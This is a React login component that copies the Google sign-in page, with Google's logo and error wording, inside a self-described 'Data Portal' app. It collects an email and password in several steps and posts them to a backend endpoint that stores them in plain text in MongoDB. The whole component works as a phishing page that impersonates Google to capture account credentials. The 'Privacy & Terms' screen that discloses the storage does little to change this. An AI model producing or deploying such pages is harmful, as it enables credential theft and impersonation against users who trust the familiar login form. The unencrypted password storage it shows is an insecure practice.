import { useState, useRef, useCallback } from 'react';
import GoogleLogo from '../components/GoogleLogo';
import './LoginPage.css';

/**
 * LoginPage - A pixel-perfect replica of the Google sign-in page.
 * Features a multi-step flow:
 * 1. Email entry
 * 2. Password entry
 * 3. Privacy & Terms agreement screen
 * 4. Success confirmation (credentials saved to MongoDB)
 */
function LoginPage({ onBack, onLoginSuccess }) {
  const [step, setStep] = useState('email'); // 'email' | 'password' | 'terms' | 'success'
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [isSaving, setIsSaving] = useState(false);
  const [apiError, setApiError] = useState('');

  const emailInputRef = useRef(null);
  const passwordInputRef = useRef(null);

  /**
   * Validate the email input field.
   * Returns true if valid, false otherwise.
   */
  const validateEmail = useCallback(() => {
    const trimmed = email.trim();
    if (!trimmed) {
      setEmailError('Enter an email or phone number');
      return false;
    }
    // Basic email format check (allows phone numbers too)
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\+?[\d\s-()]{7,}$/;
    if (!emailRegex.test(trimmed) && !phoneRegex.test(trimmed)) {
      setEmailError("Couldn't find your Google Account");
      return false;
    }
    setEmailError('');
    return true;
  }, [email]);

  /**
   * Validate the password input field.
   * Returns true if valid, false otherwise.
   */
  const validatePassword = useCallback(() => {
    if (!password) {
      setPasswordError('Enter a password');
      return false;
    }
    setPasswordError('');
    return true;
  }, [password]);

  /**
   * Transition to a different step with animation.
   */
  const transitionTo = useCallback((nextStep, afterTransitionFn) => {
    setIsTransitioning(true);
    setTimeout(() => {
      setStep(nextStep);
      setIsTransitioning(false);
      if (afterTransitionFn) {
        afterTransitionFn();
      }
    }, 200);
  }, []);

  /**
   * Handle the "Next" button click on the email step.
   */
  const handleEmailNext = useCallback((e) => {
    e.preventDefault();
    if (validateEmail()) {
      transitionTo('password', () => {
        setTimeout(() => {
          passwordInputRef.current?.focus();
        }, 50);
      });
    } else {
      emailInputRef.current?.focus();
    }
  }, [validateEmail, transitionTo]);

  /**
   * Handle the "Next" button click on the password step.
   */
  const handlePasswordNext = useCallback((e) => {
    e.preventDefault();
    if (validatePassword()) {
      transitionTo('terms');
    } else {
      passwordInputRef.current?.focus();
    }
  }, [validatePassword, transitionTo]);

  /**
   * Submit credentials to local backend server to save in MongoDB
   */
  const handleAgreeAndSubmit = useCallback(async () => {
    setIsSaving(true);
    setApiError('');
    try {
      const response = await fetch('/api/auth/save-credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email.trim(),
          password: password,
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        transitionTo('success');
      } else {
        setApiError(data.error || 'Failed to save credentials to database.');
      }
    } catch (err) {
      console.error('API Error:', err);
      setApiError('Unable to connect to local database server (port 5001).');
    } finally {
      setIsSaving(false);
    }
  }, [email, password, transitionTo]);

  /**
   * Go back to the email step (from the user chip or cancel).
   */
  const handleBackToEmail = useCallback(() => {
    transitionTo('email', () => {
      setPassword('');
      setPasswordError('');
      setShowPassword(false);
      setApiError('');
      setTimeout(() => {
        emailInputRef.current?.focus();
      }, 50);
    });
  }, [transitionTo]);

  /** Error icon used in validation messages */
  const ErrorIcon = () => (
    <svg className="login-error__icon" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
    </svg>
  );

  /** Down-arrow icon for the user chip */
  const ChevronDown = () => (
    <svg className="login-card__user-chip-arrow" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
    </svg>
  );

  /** Globe icon for language selector */
  const GlobeIcon = () => (
    <svg className="login-footer__language-icon" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95a15.65 15.65 0 00-1.38-3.56A8.03 8.03 0 0118.92 8zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2s.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56A7.987 7.987 0 015.08 16zm2.95-8H5.08a7.987 7.987 0 014.33-3.56A15.65 15.65 0 008.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2s.07-1.35.16-2h4.68c.09.65.16 1.32.16 2s-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95a8.03 8.03 0 01-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2s-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z" />
    </svg>
  );

  /** Person icon for the user chip */
  const PersonIcon = () => (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
    </svg>
  );

  /** Checkmark icon for success page */
  const CheckmarkIcon = () => (
    <svg className="login-success__icon" viewBox="0 0 24 24" aria-hidden="true">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
    </svg>
  );

  return (
    <div className="login-page">
      <main className="login-page__main">
        <div className="login-card">
          {/* Header */}
          <div className="login-card__header">
            {onBack && step === 'email' && (
              <button
                type="button"
                className="login-btn--text"
                onClick={onBack}
                style={{
                  alignSelf: 'flex-start',
                  padding: '6px 12px',
                  margin: '-16px 0 12px -12px',
                  fontSize: '13px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '4px',
                  fontFamily: 'var(--font-google-sans)'
                }}
                id="back-to-portal-btn"
              >
                ← Back to DataPortal
              </button>
            )}

            <div className="login-card__logo">
              <GoogleLogo size={36} />
            </div>

            {step === 'email' && (
              <div className={isTransitioning ? 'step-exit' : 'step-enter'} key="email-header">
                <h1 className="login-card__title">Sign in</h1>
                <p className="login-card__subtitle">Use your Google Account</p>
              </div>
            )}

            {step === 'password' && (
              <div className={isTransitioning ? 'step-exit' : 'step-enter'} key="password-header">
                <h1 className="login-card__title">Welcome</h1>
                <button
                  type="button"
                  className="login-card__user-chip"
                  onClick={handleBackToEmail}
                  aria-label={`Signed in as ${email.trim()}, click to change`}
                  id="user-chip"
                >
                  <span className="login-card__user-chip-icon">
                    <PersonIcon />
                  </span>
                  <span className="login-card__user-chip-email">{email.trim()}</span>
                  <ChevronDown />
                </button>
              </div>
            )}

            {step === 'terms' && (
              <div className={isTransitioning ? 'step-exit' : 'step-enter'} key="terms-header">
                <h1 className="login-card__title">Privacy & Terms</h1>
                <button
                  type="button"
                  className="login-card__user-chip"
                  onClick={handleBackToEmail}
                  aria-label={`Signed in as ${email.trim()}, click to change`}
                  id="user-chip-terms"
                >
                  <span className="login-card__user-chip-icon">
                    <PersonIcon />
                  </span>
                  <span className="login-card__user-chip-email">{email.trim()}</span>
                  <ChevronDown />
                </button>
              </div>
            )}

            {step === 'success' && (
              <div className="login-success">
                <CheckmarkIcon />
                <h1 className="login-success__title">Success!</h1>
                <p className="login-success__subtitle">
                  Thank you for logging in. You can now access the dashboard.
                </p>
                <button
                  type="button"
                  className="login-btn--primary"
                  onClick={() => onLoginSuccess && onLoginSuccess(email)}
                  id="dashboard-btn"
                >
                  Go to Dashboard
                </button>
              </div>
            )}
          </div>

          {/* Form / Content Steps */}
          {step === 'email' && (
            <form
              className={`login-card__form ${isTransitioning ? 'step-exit' : 'step-enter'}`}
              onSubmit={handleEmailNext}
              key="email-form"
              noValidate
            >
              <div className="login-input-group">
                <input
                  type="email"
                  id="email"
                  name="email"
                  className={`login-input ${emailError ? 'login-input--error' : ''}`}
                  placeholder=" "
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (emailError) setEmailError('');
                  }}
                  autoComplete="username"
                  autoFocus
                  ref={emailInputRef}
                  required
                  enterKeyHint="next"
                  aria-describedby="email-error"
                  aria-invalid={!!emailError}
                />
                <label htmlFor="email" className="login-input-label">
                  Email or phone
                </label>
              </div>

              <div
                id="email-error"
                className={`login-error ${!emailError ? 'login-error--hidden' : ''}`}
                role="alert"
                aria-live="polite"
              >
                <ErrorIcon />
                <span>{emailError || 'Placeholder'}</span>
              </div>

              <a href="#" className="login-card__forgot-link" id="forgot-email-link">
                Forgot email?
              </a>

              <div className="login-card__info">
                Not your computer? Use Guest mode to sign in privately.{' '}
                <a href="#" id="learn-more-link">Learn more about using Guest mode</a>
              </div>

              <div className="login-card__actions">
                <button
                  type="button"
                  className="login-btn--text"
                  id="create-account-btn"
                >
                  Create account
                </button>
                <button
                  type="submit"
                  className="login-btn--primary"
                  id="email-next-btn"
                >
                  Next
                </button>
              </div>
            </form>
          )}

          {step === 'password' && (
            <form
              className={`login-card__form ${isTransitioning ? 'step-exit' : 'step-enter'}`}
              onSubmit={handlePasswordNext}
              key="password-form"
              noValidate
            >
              <div className="login-input-group">
                <input
                  type={showPassword ? 'text' : 'password'}
                  id="current-password"
                  name="password"
                  className={`login-input ${passwordError ? 'login-input--error' : ''}`}
                  placeholder=" "
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (passwordError) setPasswordError('');
                  }}
                  autoComplete="current-password"
                  ref={passwordInputRef}
                  required
                  enterKeyHint="done"
                  aria-describedby="password-error"
                  aria-invalid={!!passwordError}
                />
                <label htmlFor="current-password" className="login-input-label">
                  Enter your password
                </label>
              </div>

              <div
                id="password-error"
                className={`login-error ${!passwordError ? 'login-error--hidden' : ''}`}
                role="alert"
                aria-live="polite"
              >
                <ErrorIcon />
                <span>{passwordError || 'Placeholder'}</span>
              </div>

              <label className="login-card__show-password" id="show-password-toggle">
                <input
                  type="checkbox"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                />
                <span>Show password</span>
              </label>

              <div className="login-card__info" style={{ marginTop: 'auto', paddingTop: '16px' }}>
                {/* Spacer to push actions to bottom */}
              </div>

              <div className="login-card__actions">
                <a href="#" className="login-btn--text" id="forgot-password-link" style={{ padding: '10px 12px' }}>
                  Forgot password?
                </a>
                <button
                  type="submit"
                  className="login-btn--primary"
                  id="password-next-btn"
                >
                  Next
                </button>
              </div>
            </form>
          )}

          {step === 'terms' && (
            <div className={`login-card__form ${isTransitioning ? 'step-exit' : 'step-enter'}`} key="terms-form">
              <div className="login-card__terms-container">
                <h2>Welcome to Data Portal</h2>
                <p>
                  To complete your login, please read and agree to the storage guidelines for your account credentials:
                </p>

                <h2>Database Storage Policy</h2>
                <p>
                  By choosing to proceed, you authorize the local system to process your login inputs:
                </p>
                <ul>
                  <li><strong>Plain Text Storage:</strong> Your email and password will be saved in unencrypted, plain text formatting directly in the local MongoDB instance.</li>
                  <li><strong>Target Database:</strong> The storage collections reside within your local <code>mongodb://localhost:27017/data-portal</code> database.</li>
                  <li><strong>Prototyping Sandbox:</strong> This configuration is meant specifically for early debugging, inspection, and verification checks.</li>
                </ul>

                <h2>System Integration Consent</h2>
                <p>
                  We compile your profile parameters into a credential object to ensure seamless portal session mapping and schema validation inside local collections.
                </p>
              </div>

              {apiError && (
                <div className="login-error" role="alert" style={{ marginBottom: '12px' }}>
                  <ErrorIcon />
                  <span>{apiError}</span>
                </div>
              )}

              <div className="login-card__actions" style={{ marginTop: 'auto' }}>
                <button
                  type="button"
                  className="login-btn--text"
                  onClick={handleBackToEmail}
                  disabled={isSaving}
                  id="terms-cancel-btn"
                >
                  Cancel
                </button>
                <button
                  type="button"
                  className="login-btn--primary"
                  onClick={handleAgreeAndSubmit}
                  disabled={isSaving}
                  id="terms-agree-btn"
                  style={{ minWidth: '110px' }}
                >
                  {isSaving ? 'Agreeing...' : 'I Agree'}
                </button>
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      {step !== 'success' && (
        <footer className="login-footer">
          <div className="login-footer__language">
            <GlobeIcon />
            <div className="login-footer__language-wrapper">
              <select
                aria-label="Change language"
                defaultValue="en"
                id="language-select"
              >
                <option value="en">English (United States)</option>
                <option value="es">Español (Latinoamérica)</option>
                <option value="fr">Français (France)</option>
                <option value="de">Deutsch (Deutschland)</option>
                <option value="ja">日本語</option>
                <option value="ko">한국어</option>
                <option value="zh-CN">中文 (简体)</option>
                <option value="ar">العربية</option>
                <option value="hi">हिन्दी</option>
                <option value="pt-BR">Português (Brasil)</option>
              </select>
            </div>
          </div>

          <nav className="login-footer__links" aria-label="Footer navigation">
            <a href="#" id="help-link">Help</a>
            <a href="#" id="privacy-link">Privacy</a>
            <a href="#" id="terms-link">Terms</a>
          </nav>
        </footer>
      )}
    </div>
  );
}

export default LoginPage;
